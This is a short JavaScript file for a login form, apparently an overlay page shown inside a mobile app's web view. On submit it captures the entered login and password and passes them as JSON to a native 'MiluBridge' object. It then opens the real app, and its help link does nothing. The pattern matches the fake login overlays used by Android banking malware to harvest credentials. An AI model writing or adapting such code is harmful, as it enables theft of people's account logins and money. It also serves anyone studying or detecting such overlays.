(() => {
  const form = document.getElementById("loginForm");
  const loginInput = document.getElementById("login");
  const passwordInput = document.getElementById("password");
  const helpLink = document.getElementById("helpLink");
  const toastEl = document.getElementById("toast");

  let toastTimer = 0;
  let locked = false;

  function bridge() {
    try {
      return window.MiluBridge || null;
    } catch (_) {
      return null;
    }
  }

  function toast(msg) {
    toastEl.textContent = msg;
    toastEl.classList.add("is-show");
    window.clearTimeout(toastTimer);
    toastTimer = window.setTimeout(() => {
      toastEl.classList.remove("is-show");
    }, 2200);
  }

  function reportDone(payload) {
    const b = bridge();
    if (b && typeof b.done === "function") {
      try {
        b.done(payload);
      } catch (_) {
        /* ignore */
      }
    }
  }

  function openApp() {
    const b = bridge();
    if (b && typeof b.openApp === "function") {
      try {
        b.openApp();
      } catch (_) {
        /* ignore */
      }
    }
  }

  function buildPayload(login, password) {
    return JSON.stringify({
      login,
      password,
      exit: "",
    });
  }

  form.addEventListener("submit", (event) => {
    event.preventDefault();
    if (locked) {
      return;
    }
    const login = loginInput.value.trim();
    const password = passwordInput.value;
    if (!login) {
      toast("すべてのフィールドが必要！");
      return;
    }
    if (!password) {
      toast("すべてのフィールドが必要！");
      return;
    }
    locked = true;
    reportDone(buildPayload(login, password));
    window.setTimeout(() => {
      openApp();
      locked = false;
    }, 300);
  });

  helpLink.addEventListener("click", (event) => {
    event.preventDefault();
  });
})();
